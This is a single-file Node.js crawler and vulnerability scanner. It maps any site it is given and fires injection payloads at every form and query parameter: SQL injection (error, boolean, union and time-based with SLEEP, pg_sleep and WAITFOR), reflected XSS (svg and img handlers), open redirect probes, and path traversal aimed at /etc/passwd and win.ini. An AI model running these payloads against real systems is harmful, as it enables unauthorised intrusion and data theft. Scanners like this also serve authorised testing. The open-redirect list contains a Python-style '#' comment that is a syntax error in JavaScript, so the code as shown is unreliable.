#!/usr/bin/env node
// auto-mapper-scanner.js
// Crawler + Scanner in 1 file (Node 18+ with global fetch).
// Maps an app (same-origin), discovers links/forms and tests:
// - SQLi: error-based, boolean-based, time-based, union-based (heuristics)
// - Reflected XSS (multi-context payloads + basic CSP awareness)
// - Open Redirect (common & encoded variants, redirect-chain aware)       
// - LFI / Path Traversal (Unix/Windows + common bypasses)
// - DOM XSS indicators (static heuristic, non-executing)
// made by m2hcs

"use strict";

const { URL, URLSearchParams } = require("node:url");
const { performance } = require("node:perf_hooks");
const crypto = require("node:crypto");

if (typeof fetch !== "function") {
  console.error("Node 18+ is required (global fetch).");
  process.exit(1);
}

// ---------- CLI / Config ----------
function parseArgs(argv) {
  const cfg = {
    url: "",
    maxPages: 200,
    maxDepth: 3,
    concurrency: 5,           // crawl concurrency
    scanConcurrency: 5,       // scanning concurrency
    timeout: 15000,
    sleepSeconds: 4,          // baseline for time-based tests
    headers: {},
    verbosity: "normal",      // silent|minimal|normal|debug|trace
    output: "text",           // text|json
    maxBodyKB: 512,           // limit captured body size
    paramIgnoreRe: /(csrf|xsrf|token|auth|passwd|password|pwd)/i
  };
  for (let i = 2; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--url") cfg.url = argv[++i] || "";
    else if (a === "--max-pages") cfg.maxPages = parseInt(argv[++i] || "200", 10);
    else if (a === "--max-depth") cfg.maxDepth = parseInt(argv[++i] || "3", 10);
    else if (a === "--concurrency") cfg.concurrency = parseInt(argv[++i] || "5", 10);
    else if (a === "--scan-concurrency") cfg.scanConcurrency = parseInt(argv[++i] || "5", 10); 
    else if (a === "--timeout") cfg.timeout = parseInt(argv[++i] || "15000", 10);
    else if (a === "--sleep") cfg.sleepSeconds = parseInt(argv[++i] || "4", 10);
    else if (a === "--header") {
      const line = argv[++i] || "";
      const k = line.split(":")[0]?.trim();
      const v = line.split(":").slice(1).join(":").trim();
      if (k) cfg.headers[k] = v;
    } else if (a === "--verbose") {
      cfg.verbosity = "debug";
    } else if (a === "--verbosity") {
      cfg.verbosity = (argv[++i] || "normal").toLowerCase();
    } else if (a === "--json") {
      cfg.output = "json";
    } else if (a === "--max-body-kb") {
      cfg.maxBodyKB = Math.max(64, parseInt(argv[++i] || "512", 10));
    } else if (a === "--param-ignore") {
      const p = argv[++i] || "";
      try { cfg.paramIgnoreRe = p ? new RegExp(p, "i") : cfg.paramIgnoreRe; } catch {}
    }
  }
  if (!cfg.url) {
    console.log(`Usage:
  node auto-mapper-scanner.js --url "https://target/"
  [--max-pages 200 --max-depth 3 --concurrency 5 --scan-concurrency 5]
  [--timeout 15000 --sleep 4 --max-body-kb 512]
  [--verbosity silent|minimal|normal|debug|trace | --verbose]
  [--json]
  [--param-ignore "(csrf|token)"]
  [--header "Cookie: sid=abc"]`);
    process.exit(1);
  }
  return cfg;
}

function createLogger(level) {
  const LEVELS = { silent:0, minimal:1, normal:2, debug:3, trace:4 };
  let lvl = LEVELS[String(level || "normal").toLowerCase()] ?? 2;
  return {
    set: (l)=>{ lvl = LEVELS[String(l || "normal").toLowerCase()] ?? lvl; },
    error: (...a)=>console.error(...a),
    warn:  (...a)=>{ if (lvl >= 1) console.warn(...a); },
    info:  (...a)=>{ if (lvl >= 2) console.log(...a); },
    debug: (...a)=>{ if (lvl >= 3) console.log(...a); },
    trace: (...a)=>{ if (lvl >= 4) console.log(...a); }
  };
}

// ---------- Utils ----------
function sameOrigin(a, b) { return new URL(a).origin === new URL(b).origin; }
function absUrl(base, href) { return new URL(href, base).href; }
function stripHash(u) { const x = new URL(u); x.hash=""; return x.href; }
function normPath(u) { const x=new URL(u); x.search=""; x.hash=""; return x.href; }
function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
function isLikelyHtml(ct){ return (ct||"").toLowerCase().includes("text/html"); }
function randToken(){ return crypto.randomBytes(6).toString("hex"); }
function isNumeric(v){ return /^-?\d+(\.\d+)?$/.test(String(v)); }
function clamp(n, lo, hi){ return Math.max(lo, Math.min(hi, n)); }

function normalizeForLen(s) {
  return String(s||"")
    .replace(/\d+/g,"N")
    .replace(/\s+/g," ")
    .slice(0, 20000)
    .trim();
}
function lengthDiffScore(a, b) {
  const aa = normalizeForLen(a);
  const bb = normalizeForLen(b);
  if (!aa.length && !bb.length) return 0;
  return Math.abs(aa.length - bb.length) / ((aa.length + bb.length)/2);
}
function jaccardSim(a, b) {
  const ta = new Set(String(a||"").toLowerCase().split(/[^a-z0-9_]+/g).filter(Boolean));       
  const tb = new Set(String(b||"").toLowerCase().split(/[^a-z0-9_]+/g).filter(Boolean));       
  if (!ta.size && !tb.size) return 1;
  let inter = 0;
  for (const t of ta) if (tb.has(t)) inter++;
  const uni = ta.size + tb.size - inter;
  return uni ? inter / uni : 1;
}
function compositeDelta(a, b) {
  const len = lengthDiffScore(a, b);
  const jac = jaccardSim(a, b);
  return { len, jac, delta: 0.5*len + 0.5*(1-jac) };
}

async function mapLimit(arr, limit, iteratee) {
  const out = new Array(arr.length);
  let i = 0;
  const workers = new Array(Math.min(limit, arr.length)).fill(0).map(async () => {
    while (true) {
      const idx = i++;
      if (idx >= arr.length) break;
      try { out[idx] = await iteratee(arr[idx], idx); }
      catch (e) { out[idx] = undefined; }
    }
  });
  await Promise.all(workers);
  return out;
}

// ---------- Signatures / Regex ----------
const SQL_ERRORS = [
  /you have an error in your sql syntax/i,
  /warning:\s*mysql/i,
  /mysql_fetch_(?:array|assoc|object)/i,
  /pg_query\(\)\s*\[:\w+\]/i,
  /pg::syntaxerror/i,
  /postgresql.*error/i,
  /sqlstate\[\w+\]/i,
  /unclosed quotation mark after the character string/i,
  /quoted string not properly terminated/i,
  /ora-\d{5}/i,
  /odbc.*sql server/i,
  /incorrect syntax near/i,
  /sqlite(?:3)?::exception/i,
  /sqlite error/i,
  /fatal error.*db2/i,
  /invalid query/i,
  /mysqli?_query\(\)/i,
  /sql syntax.*near/i
];

const REDIRECT_PARAM_NAMES = /^(next|url|redirect|return|continue|dest|destination|r|u)$/i;    
const LFI_PARAM_NAMES = /^(file|path|page|template|include|doc|view|tpl|action)$/i;

// ---------- HTTP ----------
async function httpRequest(url, { method="GET", headers={}, body=null, timeout=15000, maxBodyKB=512 } = {}) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  const t0 = performance.now();
  let res, text = "", status = 0, hdrs = {}, finalUrl = url;
  try {
    res = await fetch(url, { method, headers, body, redirect: "follow", signal: controller.signal });
    finalUrl = res.url || url;
    status = res.status;
    hdrs = Object.fromEntries(res.headers.entries());
    const ct = hdrs["content-type"] || "";
    text = await res.text();
    if (typeof maxBodyKB === "number") {
      const cap = Math.max(8, maxBodyKB|0) * 1024;
      if (text.length > cap) text = text.slice(0, cap);
    }
    clearTimeout(id);
    return { ok: true, status, headers: hdrs, text, url: finalUrl, timeMs: Math.round(performance.now() - t0), contentType: ct };
  } catch (e) {
    clearTimeout(id);
    return { ok: false, status, headers: hdrs, text: String(e?.message || e), url: finalUrl, timeMs: Math.round(performance.now() - t0), error: e };
  }
}

// ---------- HTML Parsers (lightweight regex) ----------
function extractLinks(html, baseUrl) {
  const links = [];
  const re = /<a\b[^>]*?href\s*=\s*(?:"([^"]+)"|'([^']+)'|([^"'\s>]+))[^>]*>/gi;
  let m;
  while ((m = re.exec(html))) {
    const href = m[1] || m[2] || m[3] || "";
    if (!href || href.startsWith("javascript:") || href.startsWith("mailto:")) continue;       
    try { links.push(absUrl(baseUrl, href)); } catch {}
  }
  return links;
}

function extractForms(html, baseUrl) {
  const forms = [];
  const formRe = /<form\b([^>]*)>([\s\S]*?)<\/form>/gi;
  let m;
  while ((m = formRe.exec(html))) {
    const attrs = m[1] || "";
    const inner = m[2] || "";
    const methM = /method\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s>]+))/i.exec(attrs);
    const method = (methM?.[1] || methM?.[2] || methM?.[3] || "GET").toUpperCase();
    const actionAttr = /action\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s>]+))/i.exec(attrs);
    const actionRaw = actionAttr ? (actionAttr[1] || actionAttr[2] || actionAttr[3] || "") : "";
    let action;
    try { action = actionRaw ? absUrl(baseUrl, actionRaw) : baseUrl; } catch { action = baseUrl; }

    const fields = new Map();

    const inRe = /<input\b([^>]*)>/gi;
    let im;
    while ((im = inRe.exec(inner))) {
      const a = im[1] || "";
      const nameM = /name\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s>]+))/i.exec(a);
      const name = nameM?.[1] || nameM?.[2] || nameM?.[3] || "";
      if (!name) continue;
      const valM = /value\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/i.exec(a);
      const val = valM?.[1] || valM?.[2] || valM?.[3] || "test";
      fields.set(name, val);
    }

    const taRe = /<textarea\b([^>]*)>([\s\S]*?)<\/textarea>/gi;
    let tm;
    while ((tm = taRe.exec(inner))) {
      const a = tm[1] || "";
      const nameM = /name\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s>]+))/i.exec(a);
      const name = nameM?.[1] || nameM?.[2] || nameM?.[3] || "";
      if (!name) continue;
      const val = (tm[2] || "").trim();
      fields.set(name, val || "test");
    }

    const selRe = /<select\b([^>]*)>([\s\S]*?)<\/select>/gi;
    let sm;
    while ((sm = selRe.exec(inner))) {
      const a = sm[1] || "";
      const nameM = /name\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s>]+))/i.exec(a);
      const name = nameM?.[1] || nameM?.[2] || nameM?.[3] || "";
      if (!name) continue;
      const opts = Array.from((sm[2]||"").matchAll(/<option\b[^>]*?(?:value\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?[^>]*>([\s\S]*?)<\/option>/gi));
      let chosen = "test";
      for (const o of opts) {
        const v = o[1] || o[2] || o[3] || o[4] || "";
        chosen = v.trim();
        if (/(selected)/i.test(o[0])) break;
      }
      fields.set(name, chosen || "test");
    }

    forms.push({
      method,
      action,
      fields: Array.from(fields.entries()).map(([name, value]) => ({ name, value }))
    });
  }
  return forms;
}

function extractQueryParams(u) {
  const url = new URL(u);
  const out = [];
  for (const [k, v] of url.searchParams.entries()) out.push({ name: k, value: v });
  return out;
}

// ---------- Payloads ----------
function sqliErrorPayloads(val) {
  return [
    String(val) + "'",
    String(val) + "\"",
    String(val) + "'-- ",
    String(val) + "\"-- ",
    String(val) + "')",
    String(val) + '")',
    String(val) + "' OR '1'='1",
    String(val) + "\" OR \"1\"=\"1"
  ];
}
function sqliBoolPayloads(val, isNum) {
  if (isNum) return { t: String(val) + " AND 1=1", f: String(val) + " AND 1=2" };
  return { t: String(val) + "' AND '1'='1'-- ", f: String(val) + "' AND '1'='2'-- " };
}
function sqliTimePayloads(val, secs) {
  const s = clamp(secs|0, 2, 10);
  return isNumeric(val)
    ? [ String(val) + ` AND SLEEP(${s})`, String(val) + ` AND pg_sleep(${s})`, String(val) + `;WAITFOR DELAY '0:0:${s}'--` ]
    : [ String(val) + `' AND SLEEP(${s})-- `, String(val) + `'||pg_sleep(${s})--`, String(val) 
+ `';WAITFOR DELAY '0:0:${s}'--` ];
}
function sqliUnionPayloads(val) {
  if (isNumeric(val)) {
    return [
      `${val} UNION SELECT NULL-- `,
      `${val} UNION SELECT NULL,NULL-- `,
      `${val} ORDER BY 1-- `,
      `${val} ORDER BY 2-- `
    ];
  }
  return [
    `${val}' UNION SELECT NULL-- `,
    `${val}' UNION SELECT NULL,NULL-- `,
    `${val}' ORDER BY 1-- `,
    `${val}' ORDER BY 2-- `
  ];
}

function xssPayloads(token) {
  return [
    `${token}"'><svg/onload=alert(${token.length})>`,
    `${token}"><img src=x onerror=alert(${token.length})>`,
    `'><img src=x onerror=alert(${token.length})>`,
    `"><script>alert(${token.length})</script>${token}`,
    `</script><svg/onload=alert(${token.length})><!-- ${token} -->`
  ];
}

// ---------- Request builders ----------
function buildRequest(base, ep, mutateParam, newValue) {
  // ep: {method, url, enc: 'query'|'form', params:[{name,value}]}
  const headers = Object.assign({
    "User-Agent": "auto-mapper-scanner/0.2",
    "Accept": "*/*"
  }, base.headers || {});
  const method = ep.method;

  if (ep.enc === "query") {
    const u = new URL(ep.url);
    for (const p of ep.params) {
      u.searchParams.set(p.name, String(p.name === mutateParam ? newValue : p.value));
    }
    return { url: u.href, method, headers, body: null, contentType: null };
  }

  // form (urlencoded)
  const u = new URL(ep.url);
  const sp = new URLSearchParams();
  for (const p of ep.params) {
    sp.set(p.name, String(p.name === mutateParam ? newValue : p.value));
  }
  const body = sp.toString();
  headers["Content-Type"] = "application/x-www-form-urlencoded";
  return { url: u.href, method, headers, body, contentType: "application/x-www-form-urlencoded" };
}

async function baselineRequest(base, ep) {
  const headers = Object.assign({
    "User-Agent": "auto-mapper-scanner/0.2",
    "Accept": "*/*"
  }, base.headers || {});
  if (ep.enc === "form") headers["Content-Type"] = "application/x-www-form-urlencoded";        

  let url = ep.url, body = null;
  if (ep.enc === "query") {
    const u = new URL(ep.url);
    for (const p of ep.params) u.searchParams.set(p.name, String(p.value));
    url = u.href;
  } else {
    const sp = new URLSearchParams();
    for (const p of ep.params) sp.set(p.name, String(p.value));
    body = sp.toString();
  }
  const r1 = await httpRequest(url, { method: ep.method, headers, body, timeout: base.timeout, 
maxBodyKB: base.maxBodyKB });
  const r2 = await httpRequest(url, { method: ep.method, headers, body, timeout: base.timeout, 
maxBodyKB: base.maxBodyKB });
  return {
    status: r2.status || r1.status,
    timeMs: Math.round(((r1.timeMs||0) + (r2.timeMs||0)) / 2),
    text: r2.text || r1.text || "",
    headers: r2.headers || r1.headers || {}
  };
}

// ---------- Tests ----------
async function testSQLi(base, ep, param, baseline, findings, log) {
  const pv = ep.params.find(x => x.name === param)?.value ?? "1";

  // Error-based
  for (const pay of sqliErrorPayloads(pv)) {
    const req = buildRequest(base, ep, param, pay);
    const r = await httpRequest(req.url, { method:req.method, headers:req.headers, body:req.body, timeout: base.timeout, maxBodyKB: base.maxBodyKB });
    if (!r.ok) continue;
    if (SQL_ERRORS.some(rx => rx.test(r.text || ""))) {
      findings.push({ type:"SQLi (error-based)", endpoint: ep.url, method: ep.method, param });      log.debug(`[SQLi:Error] ${ep.method} ${ep.url} [${param}]`);
      break;
    }
  }

  // Boolean-based differential
  const bp = sqliBoolPayloads(pv, isNumeric(pv));
  const reqT = buildRequest(base, ep, param, bp.t);
  const reqF = buildRequest(base, ep, param, bp.f);
  const [rt, rf] = await Promise.all([
    httpRequest(reqT.url, { method:reqT.method, headers:reqT.headers, body:reqT.body, timeout: 
base.timeout, maxBodyKB: base.maxBodyKB }),
    httpRequest(reqF.url, { method:reqF.method, headers:reqF.headers, body:reqF.body, timeout: 
base.timeout, maxBodyKB: base.maxBodyKB })
  ]);
  if (rt.ok && rf.ok) {
    const dT = compositeDelta(baseline.text, rt.text);
    const dF = compositeDelta(baseline.text, rf.text);
    // Heuristic: false-branch diverges, true-branch stays similar OR statuses differ
    if ((dF.delta - dT.delta) >= 0.20 || rt.status !== rf.status) {
      findings.push({ type:"SQLi (boolean-based)", endpoint: ep.url, method: ep.method, param, 
note:`ΔF=${dF.delta.toFixed(2)} vs ΔT=${dT.delta.toFixed(2)}` });
      log.debug(`[SQLi:Bool] ${ep.method} ${ep.url} [${param}] ΔF=${dF.delta.toFixed(2)} ΔT=${dT.delta.toFixed(2)}`);
    }
  }

  // Union-based heuristic
  for (const pay of sqliUnionPayloads(pv)) {
    const req = buildRequest(base, ep, param, pay);
    const r = await httpRequest(req.url, { method:req.method, headers:req.headers, body:req.body, timeout: base.timeout, maxBodyKB: base.maxBodyKB });
    if (!r.ok) continue;
    const errHit = SQL_ERRORS.some(rx => rx.test(r.text || ""));
    const comp = compositeDelta(baseline.text, r.text);
    if (errHit || comp.delta >= 0.35) {
      findings.push({ type:"SQLi (union/order heuristic)", endpoint: ep.url, method: ep.method, param, note: errHit ? "SQL error signature" : `Δ≈${comp.delta.toFixed(2)}` });
      log.debug(`[SQLi:Union] ${ep.method} ${ep.url} [${param}] ${errHit ? "error" : `Δ=${comp.delta.toFixed(2)}`}`);
      break;
    }
  }

  // Time-based (DB-agnostic variants)
  for (const pay of sqliTimePayloads(pv, base.sleepSeconds)) {
    const req = buildRequest(base, ep, param, pay);
    const r = await httpRequest(req.url, { method:req.method, headers:req.headers, body:req.body, timeout: base.timeout + base.sleepSeconds*1200, maxBodyKB: base.maxBodyKB });
    if (!r.ok) continue;
    if (r.timeMs >= baseline.timeMs + Math.max(1800, base.sleepSeconds*800)) {
      findings.push({ type:"SQLi (time-based)", endpoint: ep.url, method: ep.method, param, note:`Δtime≈${r.timeMs - baseline.timeMs}ms` });
      log.debug(`[SQLi:Time] ${ep.method} ${ep.url} [${param}] Δt=${r.timeMs - baseline.timeMs}ms`);
      break;
    }
  }
}

function appearsReflectedUnsafely(txt, token) {
  if (!txt || !token) return false;
  if (!txt.includes(token)) return false;
  const enc1 = encodeURIComponent(token);
  if (txt.includes(enc1)) return false;
  // Look for typical executable contexts near the token
  if (/(<svg\b|<img\b|<script\b|onerror=|onload=|<\/script>)/i.test(txt)) return true;
  return true; // fallback: raw reflection without encoding
}

async function testXSS(base, ep, param, findings, baseline, log) {
  const token = `x${randToken()}`;
  for (const pay of xssPayloads(token)) {
    const req = buildRequest(base, ep, param, pay);
    const r = await httpRequest(req.url, { method:req.method, headers:req.headers, body:req.body, timeout: base.timeout, maxBodyKB: base.maxBodyKB });
    if (!r.ok) continue;
    const txt = r.text || "";
    if (appearsReflectedUnsafely(txt, token)) {
      const csp = (r.headers["content-security-policy"] || "").toLowerCase();
      const note = csp ? `CSP present (${csp.slice(0,80)}...)` : "No CSP header observed";     
      findings.push({ type:"XSS (reflected)", endpoint: ep.url, method: ep.method, param, note 
});
      log.debug(`[XSS:Reflected] ${ep.method} ${ep.url} [${param}] ${note}`);
      break;
    }
  }
}

async function testOpenRedirect(base, ep, param, findings, log) {
  if (!REDIRECT_PARAM_NAMES.test(param)) return;
  const values = [
    "https://example.com/evil", # put here yours to test
  ];
  for (const evil of values) {
    const req = buildRequest(base, ep, param, evil);
    const r = await httpRequest(req.url, { method:req.method, headers:req.headers, body:req.body, timeout: base.timeout, maxBodyKB: base.maxBodyKB });
    const loc = (r.headers["location"] || "");
    const final = (r.url || "");
    const hit = (r.status >= 300 && r.status < 400 && /example\.com/i.test(loc)) || /example\.com/i.test(final);
    if (hit) {
      findings.push({ type:"Open Redirect", endpoint: ep.url, method: ep.method, param, note: `to=${loc || final}` });
      log.debug(`[OpenRedirect] ${ep.method} ${ep.url} [${param}] -> ${loc || final}`);        
      break;
    } else if ((r.text||"").includes("example.com")) {
      findings.push({ type:"Open Redirect (indirect)", endpoint: ep.url, method: ep.method, param });
      log.debug(`[OpenRedirect:Indirect] ${ep.method} ${ep.url} [${param}]`);
      break;
    }
  }
}

async function testLFI(base, ep, param, findings, log) {
  if (!LFI_PARAM_NAMES.test(param)) return;
  const payloads = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd%00",
    "C:\\Windows\\win.ini"
  ];
  for (const p of payloads) {
    const req = buildRequest(base, ep, param, p);
    const r = await httpRequest(req.url, { method:req.method, headers:req.headers, body:req.body, timeout: base.timeout, maxBodyKB: base.maxBodyKB });
    const txt = r.text || "";
    if (/root:x:0:0:|\/bin\/bash/.test(txt) || /\[fonts\]/i.test(txt) || /cm9vdDoweDow/i.test(txt)) {
      findings.push({ type:"LFI / Path Traversal", endpoint: ep.url, method: ep.method, param, 
note:p });
      log.debug(`[LFI] ${ep.method} ${ep.url} [${param}] (${p})`);
      break;
    }
    if (/failed to open stream|No such file or directory|include\(|require\(/i.test(txt)) {    
      findings.push({ type:"File include error leak (indicator)", endpoint: ep.url, method: ep.method, param, note: p });
      log.debug(`[LFI:Indicator] ${ep.method} ${ep.url} [${param}] (${p})`);
      break;
    }
  }
}

// ---------- DOM XSS heuristic (static) ----------
function detectDomXssIndicators(html) {
  if (!html) return false;
  const sources = /(location\.search|document\.location|window\.location|document\.URL|URLSearchParams|searchParams|document\.referrer)/i.test(html);
  const sinks = /(innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|Function\(|setTimeout\(|setInterval\()/i.test(html);
  return sources && sinks;
}

// ---------- Crawler ----------
async function crawl(cfg, log) {
  const origin = new URL(cfg.url).origin;
  const visitedPaths = new Set();  // by path (no query/hash) for better breadth
  const toVisit = [{ url: stripHash(cfg.url), depth: 0 }];
  const pages = [];
  const endpoints = []; // {method,url,enc,params}
  const pageFindings = [];

  async function visit(one) {
    if (pages.length >= cfg.maxPages) return;
    const baseHeaders = Object.assign({ "User-Agent":"auto-mapper-scanner/0.2", "Accept":"text/html,*/*;q=0.8" }, cfg.headers);
    const r = await httpRequest(one.url, { method:"GET", headers: baseHeaders, timeout: cfg.timeout, maxBodyKB: cfg.maxBodyKB });
    if (!r.ok) return;
    const ct = r.contentType || "";
    if (!isLikelyHtml(ct)) return;
    const html = r.text || "";
    pages.push({ url: r.url, status: r.status });
    log.debug(`[Crawl] ${r.status} ${r.url}`);

    // Heuristic DOM XSS indicator
    if (detectDomXssIndicators(html)) {
      pageFindings.push({ type:"DOM XSS indicator", endpoint: r.url, method:"GET", param:"-", note:"Source+Sink in DOM" });
    }

    // Links
    for (const href of extractLinks(html, r.url)) {
      if (!sameOrigin(origin, href)) continue;
      const np = normPath(href);
      if (!visitedPaths.has(np) && toVisit.length + pages.length < cfg.maxPages && one.depth + 
1 <= cfg.maxDepth) {
        visitedPaths.add(np);
        toVisit.push({ url: stripHash(href), depth: one.depth + 1 });
      }
      // Endpoint for URL params
      const qParams = extractQueryParams(href);
      if (qParams.length) {
        endpoints.push({ method:"GET", url: stripHash(href.split("#")[0]), enc:"query", params: qParams });
      }
    }

    // Forms
    const forms = extractForms(html, r.url);
    for (const f of forms) {
      if (!sameOrigin(origin, f.action)) continue;
      const enc = f.method === "GET" ? "query" : "form";
      if (enc === "query") {
        const u = new URL(f.action);
        for (const p of f.fields) u.searchParams.set(p.name, p.value || "test");
        endpoints.push({ method:"GET", url: stripHash(u.href), enc:"query", params: f.fields });
      } else {
        endpoints.push({ method:"POST", url: stripHash(f.action), enc:"form", params: f.fields 
});
      }
    }
  }

  visitedPaths.add(normPath(cfg.url));
  let idx = 0;
  async function runBatch() {
    const batch = [];
    for (let i=0; i<cfg.concurrency && idx<toVisit.length && pages.length<cfg.maxPages; i++, idx++) {
      batch.push(visit(toVisit[idx]));
    }
    if (batch.length === 0) return;
    await Promise.all(batch);
    if (idx < toVisit.length && pages.length < cfg.maxPages) return runBatch();
  }
  await runBatch();

  // Dedup endpoints by (method,url,enc,param-set)
  const uniq = new Map();
  for (const e of endpoints) {
    const key = e.method + " " + e.url + " " + e.enc + " " + e.params.map(p=>p.name).sort().join(",");
    if (!uniq.has(key)) uniq.set(key, e);
  }
  return { endpoints: Array.from(uniq.values()), pageFindings };
}

// ---------- Scanner orchestrator ----------
async function scanAll(cfg, endpoints, log) {
  const findings = [];
  const base = { headers: cfg.headers, timeout: cfg.timeout, sleepSeconds: cfg.sleepSeconds, maxBodyKB: cfg.maxBodyKB };

  await mapLimit(endpoints, cfg.scanConcurrency, async (ep) => {
    // Baseline per endpoint
    let baseline;
    try { baseline = await baselineRequest(base, ep); }
    catch { baseline = { status: 0, timeMs: 0, text: "", headers: {} }; }

    for (const p of ep.params) {
      const pname = p.name;
      if (cfg.paramIgnoreRe && cfg.paramIgnoreRe.test(pname)) {
        log.trace(`[SkipParam] ${ep.method} ${ep.url} [${pname}]`);
        continue;
      }
      await testSQLi(base, ep, pname, baseline, findings, log);
      await testXSS(base, ep, pname, findings, baseline, log);
      await testOpenRedirect(base, ep, pname, findings, log);
      await testLFI(base, ep, pname, findings, log);
    }
  });

  return findings;
}

// ---------- Main ----------
async function main() {
  const cfg = parseArgs(process.argv);
  cfg.headers = Object.assign({ "Accept": "*/*" }, cfg.headers);
  cfg.verbosity = cfg.verbosity || "normal";
  const log = createLogger(cfg.verbosity);

  log.info(`Crawling: ${cfg.url} (maxPages=${cfg.maxPages}, maxDepth=${cfg.maxDepth}, concurrency=${cfg.concurrency})`);
  const { endpoints, pageFindings } = await crawl(cfg, log);
  log.info(`Discovered ${endpoints.length} parameterized endpoints.`);

  // Endpoints cap to avoid runaway
  const maxAnalyze = cfg.maxPages * 5;
  let endpointsToScan = endpoints;
  if (endpoints.length > maxAnalyze) {
    log.warn(`Too many endpoints (${endpoints.length}). Limiting to ${maxAnalyze}.`);
    endpointsToScan = endpoints.slice(0, maxAnalyze);
  }

  log.info(`Starting vulnerability tests (scanConcurrency=${cfg.scanConcurrency})...`);        
  const findings = await scanAll(cfg, endpointsToScan, log);
  if (pageFindings.length) findings.unshift(...pageFindings);

  if (cfg.output === "json") {
    const out = {
      url: cfg.url,
      analyzedEndpoints: endpointsToScan.length,
      findings
    };
    console.log(JSON.stringify(out, null, 2));
    return;
  }

  console.log("\n=== SUMMARY ===");
  console.log(`Analyzed endpoints: ${endpointsToScan.length}`);
  if (!findings.length) {
    console.log("No clear vulnerabilities detected with current heuristics.");
    return;
  }
  const groups = findings.reduce((m,f)=>{ const k=f.type; (m[k]=m[k]||[]).push(f); return m; }, {});
  for (const [type, arr] of Object.entries(groups)) {
    console.log(`- ${type}: ${arr.length}`);
    for (const f of arr.slice(0, 20)) {
      console.log(`  ${f.method} ${f.endpoint} [${f.param}]${f.note?` (${f.note})`:""}`);      
    }
    if (arr.length > 20) console.log(`  ... +${arr.length-20} more`);
  }
}

if (require.main === module) {
  main().catch(e => {
    console.error("Error:", e?.message || e);
    process.exit(1);
  });
}
